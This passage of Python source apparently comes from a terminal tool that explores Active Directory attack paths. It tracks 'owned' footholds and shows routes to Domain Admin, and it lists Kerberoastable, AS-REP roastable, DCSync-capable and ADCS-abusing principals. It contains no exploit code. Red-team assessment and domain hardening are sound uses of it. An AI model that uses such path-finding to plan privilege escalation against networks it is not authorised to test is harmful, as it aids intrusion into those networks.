        """The tree currently holding focus (a view may stack several), else the first."""
        trees = list(self.query(Tree))
        for t in trees:
            if t.has_focus:
                return t
        return trees[0] if trees else None

    def action_yank(self):
        """Copy the selected tree line to the system clipboard (OSC 52). On a leaf of the
        form 'label: value' it copies just the value (GUID/SID/date — ready to paste); on a
        section header (a node with children) it copies the whole block, one line each."""
        import re
        t = self._focused_tree()
        node = t.cursor_node if t else None
        if node is None:
            return

        def plain(n):
            lab = n.label
            return (lab.plain if hasattr(lab, "plain") else str(lab)).rstrip()

        if node.children:                              # a header / section — copy the block
            lines = []

            def walk(n, depth=0):
                lines.append(("  " * depth) + plain(n))
                for c in n.children:
                    walk(c, depth + 1)

            walk(node)
            copied = "\n".join(lines).strip()
            what = f"{len(lines)} lines"
        else:                                          # a single line — copy its value
            text = plain(node).strip()
            m = re.match(r"^[^:]{1,45}:\s+(.+)$", text)
            copied = m.group(1).strip() if m else text
            what = copied[:50]
        if not copied:
            return
        try:
            self.app.copy_to_clipboard(copied)
            self.app.notify(f"Copied {what}", title="Clipboard", timeout=2)
        except Exception as e:                         # terminal without OSC 52, etc.
            self.app.notify(f"Copy failed: {e}", title="Clipboard",
                            severity="error", timeout=4)

    @property
    def g(self):
        return self.app.g

    def _ctx_label(self):
        return "list"

    def _on_sid_select(self, sid):
        # selecting / double-clicking a principal INSPECTS it (node info) — it never
        # changes the start node. The start changes only on Ctrl+S. (ExploreView and
        # NodeInfoView override this for their own drill behaviour.)
        self.app.show_node_info(sid)

    # ---- labels ---------------------------------------------------------
    def _line(self, sid, edge=None):
        g, t = self.g, Text()
        if edge and edge != "MemberOf":
            style = "bold magenta" if edge in bh._DANGER else ("bold red" if edge.startswith("ESC")
                    or edge in ("DCSync", "AdminTo", "AllowedToAct") else "yellow")
            t.append(f"{edge} -> ", style=style)
        elif edge == "MemberOf":
            t.append("in ", style="grey50")
        t.append_text(ntext(g, sid, priv=self.app.priv))
        if sid in self.app.owned:
            t.append(f"  {OWNED_TAG}", style=OWNED_STYLE)
        if sid in self.app.targets:
            t.append(f"  {TARGET}", style=TARGET_STYLE)
        n = g.nodes.get(sid)
        if n and n.kind == "Computer" and bh._computer_value(g, sid, self.app.priv)[0]:
            t.append("  key target", style="bold red")
        return t

    # ---- expandability / children --------------------------------------
    def _expandable(self, sid, anc):
        g, memo = self.g, self.app.power
        for (d, l) in g.ctrl.get(sid, []):
            if d in anc:
                continue
            if l != "MemberOf" or has_power(g, d, memo):
                return True
        return False

    def _interest_key(self, s):
        g = self.g
        return (s not in self.app.priv, not bool(g.is_highvalue(s)),
                -sum(1 for (_d, l) in g.ctrl.get(s, []) if l != "MemberOf"), short(g, s).lower())

    def _owned_reach(self):
        """Map a principal sid -> sorted [(owner_name, "owned")] for every principal your
        OWNED set reaches via membership — i.e. owning that account gives you this principal's
        access. Lets a view annotate a holder/group with the owned principal that already
        grants it, instead of a duplicate branch."""
        g = self.g
        reach = {}
        for p in set(self.app.owned):
            pname = short(g, p)
            for member in bh._principal_closure(g, p):
                reach.setdefault(member, {}).setdefault(pname, "owned")
        return {k: sorted(v.items()) for k, v in reach.items()}

    def _owned_tag(self, line, sid, reach):
        """Append '✓ owned: NAME / start: NAME' to a Text line when the owned/start set
        reaches `sid` (per `_owned_reach`)."""
        if sid not in reach:
            return
        owned_n = [nm for nm, src in reach[sid] if src == "owned"]
        start_n = [nm for nm, src in reach[sid] if src == "start"]
        line.append(f"   {CHECK} ", style="bold green")
        if owned_n:
            line.append(f"{OWNED} owned: " + ", ".join(owned_n), style="bold green")
        if start_n:
            if owned_n:
                line.append("  ", style="grey50")
            line.append("start: " + ", ".join(start_n), style="bold cyan")

    def _list_sort_key(self, s):
        g = self.g
        n = g.nodes.get(s)
        dc = bool(n and n.kind == "Computer" and bh._is_dc(g, s))
        wp = bool(n and n.kind == "Computer" and bh._computer_value(g, s, self.app.priv)[0])
        return (not dc, not wp, s not in self.app.priv, short(g, s).lower())

    def _add_rights(self, node, by_right, anc):
        """Render a {right: [targets]} map as drillable children (big fan-outs collapse
        into one 'N objects' drop-down). Returns the number of right-groups added."""
        g = self.g
        for r in sorted(by_right, key=lambda r: -len(by_right[r])):
            tgts = list(dict.fromkeys(by_right[r]))
            if len(tgts) <= 15:
                self._add_target_nodes(node, r, tgts, anc)
                continue
            # a big fan-out: one drop-down PER KIND (users / computers / groups …), so each
            # opens its own full list; a small kind slice is just listed inline
            by_kind = defaultdict(list)
            for x in tgts:
                by_kind[g.nodes[x].kind if g.nodes.get(x) else "Object"].append(x)
            for kind in sorted(by_kind, key=lambda k: -len(by_kind[k])):
                ks = by_kind[kind]
                if len(ks) <= 15:
                    self._add_target_nodes(node, r, ks, anc)
                    continue
                lab = Text(f"{r} -> ", style="bold magenta" if r in bh._DANGER else "yellow")
                lab.append(f"{len(ks)} {kind.lower()}s", style="bold")
                juicy = sum(1 for x in ks if g.nodes.get(x) and g.nodes[x].kind == "Computer"
                            and bh._computer_value(g, x, self.app.priv)[0])
                if juicy:
                    lab.append(f"   {juicy} key targets", style="bold red")
                lab.append("   (Space/Enter drops down)", style="grey50")
                leaf = node.add(lab, data={"listexpand": (f"{r} -> {kind.lower()}s", ks)})
                leaf.allow_expand = True
        return len(by_right)

    def _add_target_nodes(self, node, r, tgts, anc):
        g = self.g
        for d in sorted(tgts, key=lambda s: short(g, s).lower()):
            child = node.add(self._line(d, r), data={"sid": d, "anc": anc | {d}})
            child.allow_expand = self._expandable(d, anc | {d})

    def _rights_map(self, sid, anc, skip=None):
        """{right-label: [target sids]} for the non-MemberOf control edges sid holds."""
        by_right = {}
        for (d, l) in self.g.ctrl.get(sid, []):
            if d in anc or l == "MemberOf" or l == skip:
                continue
            by_right.setdefault(l, []).append(d)
        return by_right

    def _add_attack_children(self, node, sid, anc, skip=None):
        g = self.g
        mem = [d for (d, l) in g.ctrl.get(sid, [])
               if l == "MemberOf" and d not in anc and has_power(g, d, self.app.power)]
        self._add_rights(node, self._rights_map(sid, anc, skip), anc)
        for d in sorted(mem, key=lambda s: short(g, s).lower()):
            child = node.add(self._line(d, "MemberOf"), data={"sid": d, "anc": anc | {d}})
            child.allow_expand = True

    def _add_list_children(self, node, title, sids):
        """A dropped-down fan-out: the most interesting targets inline (key targets /
        DCs / privileged first), then one link to the full searchable list."""
        g = self.g
        sids = list(dict.fromkeys(sids))
        for s in sorted(sids, key=self._list_sort_key)[:INLINE_CAP]:
            child = node.add(self._line(s), data={"sid": s, "anc": frozenset({s})})
            child.allow_expand = self._expandable(s, frozenset({s}))
        extra = len(sids) - INLINE_CAP
        tail = f"... +{extra} more — open full searchable list ->" if extra > 0 \
            else f"open full searchable list — {len(sids)} ->"
        node.add(Text(tail, style="bold grey70"), data={"list": (title, sids)}).allow_expand = False

    def _add_holder_children(self, node, holders, right=None):
        g = self.g
        reach = getattr(self, "_reach", {})      # holder_sid -> your principal names (RightsTree)
        holders = list(dict.fromkeys(holders))
        holders.sort(key=lambda s: (s not in reach, self._interest_key(s)))   # yours first
        for s in holders[:INLINE_CAP]:
            line = self._line(s)
            if s in reach:
                owned_n = [nm for nm, src in reach[s] if src == "owned"]
                start_n = [nm for nm, src in reach[s] if src == "start"]
                line.append(f"  {CHECK} ", style="bold green")
                if owned_n:
                    line.append(f"{OWNED} owned: " + ", ".join(owned_n), style="bold green")
                if start_n:
                    if owned_n:
                        line.append("  ", style="grey50")
                    line.append("start: " + ", ".join(start_n), style="bold cyan")
            child = node.add(line, data={"sid": s, "anc": frozenset({s}), "via_right": right})
            child.allow_expand = True            # always drillable: shows what it controls via the right
        if len(holders) > INLINE_CAP:
            node.add(Text(f"... +{len(holders) - INLINE_CAP} more — open full searchable list ->",
                          style="bold grey70"),
                     data={"list": ("holders", holders)}).allow_expand = False

    def _add_right_targets(self, node, sid, right):
        """When drilling a rights-search holder: the objects it actually controls with
        that right — so you can follow exactly what access the right gives you."""
        g = self.g
        tgts = list(dict.fromkeys(d for (d, l) in g.ctrl.get(sid, []) if l == right))
        if not tgts:
            return
        style = "bold magenta" if right in bh._DANGER else "yellow"
        cat = node.add(Text(f"{right} over  ({len(tgts)})", style=style), expand=True)
        for d in sorted(tgts, key=self._list_sort_key)[:INLINE_CAP]:
            c = cat.add(self._line(d, right), data={"sid": d, "anc": frozenset({sid, d})})
            c.allow_expand = self._expandable(d, frozenset({sid, d}))
        if len(tgts) > INLINE_CAP:
            cat.add(Text(f"... +{len(tgts) - INLINE_CAP} more — open full searchable list ->",
                         style="bold grey70"),
                    data={"list": (f"{right} targets", tgts)}).allow_expand = False

    def _gap(self, node):
        """A blank spacer row — opens up the tree between sections."""
        node.add_leaf(Text(" ")).allow_expand = False

    def _divider(self, node, text):
        """A dim rule that separates one section of the tree from the next."""
        node.add_leaf(Text(f"──  {text}  ──────────────", style="grey42")).allow_expand = False

    def _section(self, node, text):
        """A section heading inside the tree, shown as a reverse-video banner bar so it
        stands out clearly from the rows under it."""
        node.add_leaf(banner(text, bg="grey30")).allow_expand = False

    def _add_shortest_path(self, root, sid):
        """An explicit, drillable chain from `sid` to the nearest high-value target:
        each hop is the technique + the principal it lands you on, and every step is a
        node you can drop down or drill into to follow the route."""
        g, priv = self.g, self.app.priv
        if g.is_highvalue(sid):
            return
        reach = g.reachable(sid)
        hvs = [s for s in reach if s != sid and g.is_highvalue(s)]
        if not hvs:
            return
        target = min(hvs, key=lambda s: reach[s][0])
        path = g.bfs_path(sid, target)
        if not path or len(path) < 2:
            return
        hdr = root.add(Text(f"Shortest path to {STAR} {g.is_highvalue(target)}  "
                            f"({len(path) - 1} steps — the route is nested below)", style="bold red"),
                       expand=True)
        hdr.allow_expand = True
        self._add_path_hops(hdr, sid, target)          # one nested chain, auto-expanded

    def _add_path_hops(self, parent, src, dst, path=None):
        """Add the shortest control path src -> dst as a NESTED chain under `parent`: each
        hop is a child of the hop before it, so the route reads as one path flowing into
        itself rather than a flat broken-up list. The whole chain is auto-expanded; a hop
        opens its own node info (Enter) to branch off."""
        g, priv = self.g, self.app.priv
        path = path or g.bfs_path(src, dst)
        if not path or len(path) < 2:
            return
        seen = frozenset(p[0] for p in path)
        cursor = parent
        nodes = []
        for i, (psid, lbl) in enumerate(path):
            if i == 0:
                continue
            line = Text(f"{i}. ", style="grey50")
            estyle = ("grey50" if lbl == "MemberOf" else
                      "bold magenta" if lbl in bh._DANGER else "yellow")
            line.append(f"{lbl} ▸ ", style=estyle)
            line.append_text(ntext(g, psid, priv=priv))
            node = cursor.add(line, data={"sid": psid, "anc": seen, "loaded": True})
            nodes.append(node)
            cursor = node                              # nest the next hop inside this one
        for nd in nodes[:-1]:                          # auto-expand every hop but the last
            nd.allow_expand = True
            nd.expand()
        if nodes:
            nodes[-1].allow_expand = False             # the final target is the leaf

    def _category(self, root, label, sids, style="bold", expand=False, tag_owned=False,
                  via=None):
        """When `tag_owned`, each row gets the green ✓ owned/start tag if your owned set
        reaches it (same flag as the rights search), so held entries stand out in place.
        `via` = {sid: [edge labels]} appends how each row relates to the node (for the
        Controlled-by list: the rights that principal holds) so it reads without drilling."""
        g = self.g
        sids = list(dict.fromkeys(sids))
        if not sids:
            return
        reach = self._owned_reach() if tag_owned else None
        cat = root.add(Text(f"{label}  ({len(sids)})", style=style), expand=expand)
        for s in sorted(sids, key=self._list_sort_key)[:INLINE_CAP]:
            line = self._line(s)
            if via and via.get(s):
                line.append("   via ", style="grey50")
                for k, lbl in enumerate(via[s]):
                    if k:
                        line.append(", ", style="grey50")
                    line.append(lbl, style="bold magenta" if lbl in bh._DANGER else "yellow")
            if reach is not None:
                self._owned_tag(line, s, reach)
            child = cat.add(line, data={"sid": s, "anc": frozenset({s})})
            child.allow_expand = self._expandable(s, frozenset({s}))
        if len(sids) > INLINE_CAP:
            cat.add(Text(f"... +{len(sids) - INLINE_CAP} more (open list)", style="grey50"),
                    data={"list": (label, sids)}).allow_expand = False

    def _populate(self, node):
        data = node.data or {}
        if data.get("loaded"):
            return
        if "right" in data:
            data["loaded"] = True
            self._add_holder_children(node, data["holders"], data.get("right"))
            return
        if "listexpand" in data:
            data["loaded"] = True
            self._add_list_children(node, *data["listexpand"])
            return
        sid = data.get("sid")
        if not sid:
            return
        data["loaded"] = True
        via = data.get("via_right")
        if via:
            self._add_right_targets(node, sid, via)
        self._add_attack_children(node, sid, data.get("anc", frozenset({sid})), skip=via)

    # ---- detail pane (shared) -------------------------------------------
    def _detail(self, sid):
        """Update the shared node-detail pane in the left column."""
        self.app.set_detail(sid)

    # ---- events ---------------------------------------------------------
    def on_tree_node_expanded(self, event: Tree.NodeExpanded):
        self._populate(event.node)

    def on_tree_node_highlighted(self, event: Tree.NodeHighlighted):
        data = event.node.data or {}
        if data.get("sid"):
            self._detail(data["sid"])

    def on_tree_node_selected(self, event: Tree.NodeSelected):
        data = event.node.data or {}
        if "list" in data:
            title, sids = data["list"]
            self.app.show_list(f"{self._ctx_label()} — {title}", sids)
        elif event.node.allow_expand:
            pass          # Textual's own Enter/Space toggles it; NodeExpanded populates
        elif data.get("sid"):
            self._on_sid_select(data["sid"])

    def _cursor_sid(self):
        # a view may stack several trees (one per section); honour whichever is focused.
        trees = list(self.query(Tree))
        for t in trees:
            if t.has_focus and t.cursor_node:
                return (t.cursor_node.data or {}).get("sid")
        for t in trees:
            if t.cursor_node:
                return (t.cursor_node.data or {}).get("sid")
        return None

    def toggle_owned_cursor(self):
        """Mark/unmark the highlighted principal as owned (Ctrl+O) — works in ANY tree view
        (node info, escalation, rights, …), not only the main attack tree. Relabels the
        focused node so the 💀 shows, and refreshes the detail pane."""
        sid = self._cursor_sid()
        if not sid:
            return
        self.app.owned.discard(sid) if sid in self.app.owned else self.app.owned.add(sid)
        for t in self.query(Tree):
            node = t.cursor_node
            if node and (node.data or {}).get("sid") == sid:
                try:
                    node.set_label(self._line(sid, (node.data or {}).get("edge")))
                except Exception:
                    pass
        self._detail(sid)


# a section header shown as a reverse-video banner bar so it reads as a big, clear title
# even though a terminal can't change the glyph size. `bg` tints it to the section's accent.
def banner(text, bg="grey35", fg="white"):
    return Text(f"  {text}  ", style=f"bold {fg} on {bg}")


# --------------------------------------------------------------------------- #
# the attack-tree explorer (lives in the right-hand box)
# --------------------------------------------------------------------------- #
class ExploreView(AttackTreeBase):
    """Attack-tree explorer for one node: what it can take over (dead-end group
    memberships pruned), the credential routes to DA that need no ACL, drill in
    inline, detail along the bottom. Backspace walks back up; Ctrl+S sets a new start."""

    BINDINGS = [Binding("x", "unpin", "Unpin path", show=False)]

    def __init__(self):
        super().__init__()
        self.current = None
        self.history = []

    def compose(self) -> ComposeResult:
        # two SEPARATE trees stacked in one scroll box: the node's own attack tree, and —
        # visually disconnected below it — the out-of-band routes to DA. A separate widget
        # (not a branch off the root) is how we say "these are NOT a path from this node".
        with VerticalScroll(id="treescroll"):
            # OWNED SET first (top): all your footholds together. Then the focused node's
            # full attack tree, then out-of-band routes to DA, then your marked targets —
            # each a SEPARATE tree so the sections read as distinct, unconnected blocks.
            owned = Tree("", id="ownedtree")       # all your footholds — top of the view
            owned.show_root = True
            yield owned
            main = Tree("", id="tree")
            main.show_root = True
            yield main
            pinned = Tree("", id="pathtree")      # paths pinned from the path view
            pinned.show_root = True
            yield pinned
            other = Tree("", id="othertree")
            other.show_root = True
            yield other
            tgts = Tree("", id="targettree")       # your marked targets — its own tree
            tgts.show_root = True
            yield tgts

    def _ctx_label(self):
        return short(self.g, self.current) if self.current else "list"

    # NOTE: no _on_sid_select override — selecting a node opens its node info (the base
    # behaviour) and NEVER re-roots. The start node changes only on Ctrl+S.

    def show_empty(self):
        self.current = None
        self.app.start = None
        tree = self.query_one("#tree", Tree)
        tree.clear()
        self._fill_owned_tree()                  # OWNED SET is the content when you own things
        has_owned = bool([s for s in self.app.owned if self.g.nodes.get(s)])
        if has_owned:
            tree.display = False                 # footholds shown fully in OWNED SET above
            self.query_one("#treescroll").border_title = (
                "your footholds — Space/Enter drop down * i info * ^o owned * Bksp back")
            self._fill_other_tree()
            self._fill_target_tree()
            self.app.set_detail(intro=Text(
                "OWNED SET lists every foothold you hold and what each can take over. "
                "Other routes to DA and your targets follow below. Mark more with Ctrl+O, "
                "objects you're after with Ctrl+T.", style="grey62"))
        else:
            tree.display = True
            self.query_one("#treescroll").border_title = "attack tree — mark footholds with Ctrl+O"
            tree.root.set_label(Text("no footholds yet — mark the principals you control with Ctrl+O",
                                     style="grey62"))
            tree.root.data = None
            other = self.query_one("#othertree", Tree)
            other.clear(); other.root.set_label(Text("")); other.root.data = None
            other.display = False
            self._fill_target_tree()
            self.app.set_detail(intro=Text(
                "Mark the principals you control with Ctrl+O and they collect here as your "
                "OWNED SET, each showing what it can take over. Mark objects you're going "
                "after with Ctrl+T, then search (press /) to check reachability.",
                style="grey62"))

    def _fill_other_tree(self):
        """Fill the SEPARATE lower tree with the domain-wide routes to DA that need NO ACL
        chain from the start node — roastable privileged/DA accounts, AS-REP, non-default
        DCSync, ADCS ESC abusers. It is its own tree so it reads as disconnected from the
        node above (these are out-of-band wins, not a path from here)."""
        g, priv = self.g, self.app.priv
        other = self.query_one("#othertree", Tree)
        other.clear()
        other.display = True
        other.root.data = None
        roast_priv = [n.sid for n in g.nodes.values() if n.kind == "User"
                      and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"
                      and (n.sid in priv or g.is_highvalue(n.sid))]
        asrep = [n.sid for n in g.nodes.values() if n.kind == "User" and n.p("dontreqpreauth")]
        dcsync = set()
        for d in g.domain_sids:
            for (s, l) in g.rctrl.get(d, []):
                if (l == "DCSync" or l in bh.REPL_RIGHTS) and not bh._is_default_dcsync(g, s):
                    dcsync.add(s)
        esc_abusers = sorted({ab for (_c, ab, _t) in g.esc_branches if g.nodes.get(ab)})
        other.root.set_label(banner("OTHER ROUTES TO DA", bg="dark_red"))
        if not (roast_priv or asrep or dcsync or esc_abusers):
            other.root.add_leaf(Text("none detected", style="grey50")).allow_expand = False
            other.root.expand()
            return
        self._category(other.root, "Kerberoastable privileged / DA accounts", roast_priv, style="bold red", expand=True)
        self._category(other.root, "AS-REP roastable", asrep, style="yellow", expand=bool(asrep) and len(asrep) <= INLINE_CAP)
        self._category(other.root, "DCSync-capable (non-default)", sorted(dcsync), style="bold red", expand=True)
        self._category(other.root, "ADCS ESC abusers → domain", esc_abusers, style="bold red", expand=True)
        other.root.expand()

    def _fill_target_tree(self):
        self._fill_path_tree()
        self._fill_targets_only()

    def _fill_path_tree(self):
        """Paths pinned from the path view (p), each its own nested chain. Hidden when none."""
        g, app = self.g, self.app
        tree = self.query_one("#pathtree", Tree)
        tree.clear()
        pins = [(a, b) for (a, b) in app.paths if g.nodes.get(a) and g.nodes.get(b)]
        if not pins:
            tree.display = False
            return
        tree.display = True
        tree.root.data = None
        tree.root.set_label(banner(f"{PIN} PINNED PATHS — x on a path unpins it", bg="dark_blue"))
        for a, b in pins:
            path = g.bfs_path(a, b)
            hops = f"{len(path) - 1} hop{'s' if len(path) != 2 else ''}" if path else "no path"
            lab = Text(f"{PIN} ", style="bold")
            lab.append_text(ntext(g, a, priv=app.priv))
            lab.append("  →  ", style="bold cyan")
            lab.append_text(ntext(g, b, priv=app.priv))
            lab.append(f"   ({hops})", style="grey62")
            hdr = tree.root.add(lab, data={"pin": (a, b), "loaded": True}, expand=True)
            if path and len(path) > 1:
                self._add_path_hops(hdr, a, b, path=path)
            else:
                hdr.add_leaf(Text("✗ no control path any more", style="red")).allow_expand = False
        tree.root.expand()

    def action_unpin(self):
        tree = self.query_one("#pathtree", Tree)
        node = tree.cursor_node if tree.has_focus else None
        while node is not None and not (node.data or {}).get("pin"):
            node = node.parent
        if node is None:
            return
        pin = node.data["pin"]
        if pin in self.app.paths:
            self.app.paths.remove(pin)
            self.app.notify(f"unpinned {short(self.g, pin[0])} → {short(self.g, pin[1])}")
        self._fill_path_tree()

    def _fill_targets_only(self):
        """Fill the SEPARATE target tree with each marked target and its shortest path from
        the owned set (or, with no path, the nearest principals that CAN reach it). Its own
        tree — like OTHER ROUTES — so targets read as a distinct section. Hidden when there
        are no targets."""
        g, app = self.g, self.app
        tree = self.query_one("#targettree", Tree)
        tree.clear()
        tgts = [s for s in app.targets if g.nodes.get(s)]
        if not tgts:
            tree.display = False
            return
        tree.display = True
        tree.root.data = None
        tree.root.set_label(banner(f"{TARGET} TARGETS — reachable from your owned set?",
                                   bg="dark_goldenrod"))
        reach = app.owned_reach()
        for s in sorted(tgts, key=self._list_sort_key):
            child = tree.root.add(self._line(s), data={"sid": s, "anc": frozenset({s}),
                                                       "loaded": True})
            if s in app.owned:
                child.add_leaf(Text(f"{OWNED} you already own this",
                                    style=OWNED_STYLE)).allow_expand = False
            elif not app.owned:
                child.add_leaf(Text("mark footholds with Ctrl+O to check reachability",
                                    style="grey50")).allow_expand = False
            else:
                path = g.path_in(reach, s)
                if path and len(path) > 1:
                    child.add_leaf(Text(f"{REACH_MARK} {len(path) - 1} step"
                                        f"{'s' if len(path) != 2 else ''} from "
                                        f"{OWNED} {short(g, path[0][0])}",
                                        style="bold green")).allow_expand = False
                    self._add_path_hops(child, path[0][0], s, path=path)
                else:
                    child.add_leaf(Text("✗ no path from your owned principals",
                                        style="bold red")).allow_expand = False
                    back = g.reached_by(s)
                    near = sorted((x for x in back if x != s and g.nodes.get(x)),
                                  key=lambda x: (back[x], short(g, x).lower()))
                    if near:
                        hdr = child.add(Text(f"nearest principals that reach it ({len(near)}) "
                                             "— compromise one of these", style="grey70"))
                        for x in near[:INLINE_CAP]:
                            line = self._line(x)
                            line.append(f"   {back[x]}h to target", style="grey50")
                            hdr.add(line, data={"sid": x, "anc": frozenset({x})}).allow_expand = False
                        if len(near) > INLINE_CAP:
                            hdr.add(Text(f"... +{len(near) - INLINE_CAP} more (open list)",
                                         style="grey50"),
                                    data={"list": (f"Who can reach {short(g, s)}", near)}).allow_expand = False
                        hdr.allow_expand = True
                        hdr.expand()
            child.allow_expand = True
            child.expand()
        tree.root.expand()

    def _fill_owned_tree(self):
        """Fill the OWNED SET tree (top of the view) with ALL your footholds together, each
        fully expanded to its route to high-value + what it is in and can take over. This is
        the whole attack surface of what you hold — there is no separate 'focused' tree; the
        tree hides only when you own nothing."""
        g = self.g
        owned = [s for s in self.app.owned if g.nodes.get(s)]
        tree = self.query_one("#ownedtree", Tree)
        tree.clear()
        if not owned:                              # own nothing -> hide the tree entirely
            tree.display = False
            return
        tree.display = True
        tree.root.data = None
        tree.root.set_label(banner(f"{OWNED} OWNED SET ({len(owned)}) — your footholds and "
                                   "what each can take over", bg="dark_green"))
        few = len(owned) <= 5                      # auto-open group rights only for a few
        for s in sorted(owned, key=self._list_sort_key):
            anc = frozenset({s})
            child = tree.root.add(self._line(s), data={"sid": s, "anc": anc})
            # pre-attach this foothold's shortest route to high-value, then everything it is
            # in and can take over, so a group's OTHER rights (not just the shortest-path
            # hop) show here too.
            tgt = None
            if not g.is_highvalue(s):
                reach = g.reachable(s)
                hvs = [h for h in reach if h != s and g.is_highvalue(h)]
                tgt = min(hvs, key=lambda h: reach[h][0]) if hvs else None
            if tgt is not None:
                self._add_path_hops(child, s, tgt)
            n_before = len(child.children)
            if self._expandable(s, anc):
                kind = g.nodes[s].kind.lower()
                self._section(child, f"DIRECT — what this {'user' if kind == 'user' else kind} "
                                     "is in and can take over")
                self._add_attack_children(child, s, anc)
            if len(child.children) > n_before or tgt is not None:
                child.data["loaded"] = True          # content attached; don't re-populate
                child.allow_expand = True
                child.expand()
                if few:
                    for c in child.children[n_before:]:
                        if (c.data or {}).get("sid") and c.allow_expand:
                            self._populate(c)
                            c.expand()
            else:
                child.allow_expand = False
                child.data["owned_leaf"] = True      # selecting it inspects, never pivots
        tree.root.expand()

    def load(self, sid, push=True):
        if not sid:
            self.show_empty()
            return
        if push and self.current and self.current != sid:
            self.history.append(self.current)
        self.current = sid
        self.app.start = sid
        g, priv = self.g, self.app.priv
        tree = self.query_one("#tree", Tree)
        tree.clear()

        if sid in self.app.owned:
            # the node is one of your footholds — it's rendered IN FULL inside OWNED SET at
            # the top, so don't duplicate it as a separate tree here.
            tree.display = False
            self.query_one("#treescroll").border_title = (
                "your footholds — Space/Enter drop down * i info * ^o owned * Bksp back")
        else:
            tree.display = True
            self.query_one("#treescroll").border_title = (
                f"exploring {short(g, sid)}  —  Space/Enter drop down * i info * ^o owned * Bksp back")
            tree.root.set_label(self._line(sid))
            tree.root.data = {"sid": sid, "anc": frozenset({sid}), "loaded": True}
            # --- everything tied to THIS node (its own groups/privileges) ---
            kindword = "user" if g.nodes[sid].kind == "User" else g.nodes[sid].kind.lower()
            self._add_shortest_path(tree.root, sid)
            self._section(tree.root, f"DIRECT — what this {kindword} is in and can take over")
            self._add_attack_children(tree.root, sid, frozenset({sid}))
            comps = [s for s in g.reachable(sid) if s != sid and g.nodes.get(s) and g.nodes[s].kind == "Computer"]
            self._category(tree.root, "Key targets", [s for s in comps if bh._computer_value(g, s, priv)[0]])
            if g.nodes[sid].kind == "User":
                self._category(tree.root, "Local admin on", [d for (d, l) in g.ctrl.get(sid, []) if l == "AdminTo"])
                self._category(tree.root, "Has a session on",
                               [c for c, cn in g.nodes.items() if cn.kind == "Computer" and sid in cn.sessions])
            if g.nodes[sid].kind == "Group":
                self._category(tree.root, "Members", [m for m in bh._expand_members(g, sid)
                               if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer")])
            tree.root.expand()
            kids = [c for c in tree.root.children if (c.data or {}).get("sid")]
            if len(kids) <= 20:
                for c in kids:
                    self._populate(c)
                    c.expand()

        # OWNED SET (all footholds), domain-wide out-of-band wins, your targets — each its
        # own tree. OWNED SET sits above; the exploring tree (if any) is between.
        self._fill_owned_tree()
        self._fill_other_tree()
        self._fill_target_tree()
        self._detail(sid)
        (self.query_one("#ownedtree", Tree) if sid in self.app.owned else tree).focus()

    def root_back(self):
        if self.history:
            self.load(self.history.pop(), push=False)

    def act_info(self):
        sid = self._cursor_sid() or self.current
        if sid:
            self.app.show_node_info(sid)

    def act_owned(self):
        sid = self._cursor_sid()
        if not sid:
            return
        self.app.owned.discard(sid) if sid in self.app.owned else self.app.owned.add(sid)
        # reload so the OWNED SET (top of the view) reflects the change — a node that just
        # became owned moves into the owned set and its separate exploring tree is dropped.
        if self.current:
            self.load(self.current, push=False)
        else:
            self.show_empty()
        self._detail(sid)


# --------------------------------------------------------------------------- #
# rights browser — rights as a tree, drop holders down in place
# --------------------------------------------------------------------------- #
class RightsTree(AttackTreeBase):
    """Every control right as an expandable node: Space/Enter drops its holders down
    right here; a holder drills into its own attack tree, or expands further."""

    def _ctx_label(self):
        return "rights"

    def on_mount(self):
        g = self.g
        holders = {}
        for n in g.nodes.values():
            for (psid, r, _inh) in n.aces:
                if r in bh.CONTROL_RIGHTS or r in bh.REPL_RIGHTS:
                    holders.setdefault(r, set()).add(psid)
        self._reach = self._owned_reach()                    # holder_sid -> [your principal names]
        yours = set(self._reach)
        # a right is "held" when one of its holders is a principal you reach
        held = {r for r, hs in holders.items() if hs & yours}
        tree = self.query_one("#tree", Tree)
        have = "owned set" if self.app.owned else "nothing owned yet"
        tree.border_title = ("control rights — Space/Enter drops holders down · "
                             f"{CHECK} = held by your {have} · Esc back")
        tree.root.set_label(Text("control rights present in this domain", style="bold"))
        tree.root.data = None
        for r in sorted(holders, key=lambda r: (r not in held, -len(holders[r]))):
            lab = Text()
            if r in held:
                lab.append(f"{CHECK} ", style="bold green")
            lab.append(r, style="bold green" if r in held else "yellow")
            lab.append(f"   ({len(holders[r])})", style="grey62")
            node = tree.root.add(lab, data={"right": r, "holders": sorted(holders[r])})
            node.allow_expand = True
        tree.root.expand()
        self.app.set_detail(intro=Text(
            "Pick a right and drop it down to see who holds it. A holder you control "
            f"(or are a member of) is flagged {CHECK} with the owned principal that "
            "gives you it. Drill any holder further.", style="grey62"))
        tree.focus()


# --------------------------------------------------------------------------- #
# escalation routes to DA — interactive, every route is a drillable node
# --------------------------------------------------------------------------- #
class EscalationView(AttackTreeBase):
    """Routes to a high-value target, laid out like the attack tree instead of a text
    dump: credential wins (roastable DA, DCSync, LAPS, ADCS ESC), the ACL start points
    that reach high-value, and the domain-wide footholds — each a drillable node."""

    def _ctx_label(self):
        return "escalation"

    def _acl_starts(self):
        g = self.g
        # always sweep EVERY non-admin account — the full domain-wide picture of which
        # low-priv principals reach high-value by ACL, fewest hops first (not scoped to
        # the current start / owned set).
        # members of Domain/Enterprise Admins are already the goal, not a start point
        da = bh._da_member_set(g)
        launch = [n.sid for n in g.nodes.values()
                  if n.kind == "User" and not bh._is_admin(g, n.sid) and n.sid not in da]
        starts = []
        for s in launch:
            if s not in g.nodes:
                continue
            reach = g.reachable(s)
            hits = [h for h in reach if h != s and g.is_highvalue(h)]
            if hits:
                tgt = min(hits, key=lambda h: reach[h][0])
                starts.append((s, reach[tgt][0], tgt))
        starts.sort(key=lambda x: x[1])                 # fewest hops first
        return starts

    def _danger_holders(self, exclude):
        """Every non-admin user/group that holds a DANGEROUS right (GenericAll / WriteDacl /
        ForceChangePassword / AddKeyCredentialLink / ReadLAPSPassword / ReadGMSAPassword …)
        over ANY object — the full privesc surface, even when the chain never reaches a
        high-value node. Counts DIRECT edges only (a principal that merely INHERITS a group's
        rights is represented by that group). Returns [(sid, n_objects)] widest-first;
        `exclude` drops any sids already shown elsewhere."""
        g = self.g
        out = []
        for n in g.nodes.values():
            if n.kind not in ("User", "Group") or bh._is_admin(g, n.sid) or n.sid in exclude:
                continue
            tgts = {d for (d, l) in g.ctrl.get(n.sid, [])      # DIRECT edges only
                    if l in bh._DANGER and d != n.sid and g.nodes.get(d)}
            if tgts:
                out.append((n.sid, len(tgts)))
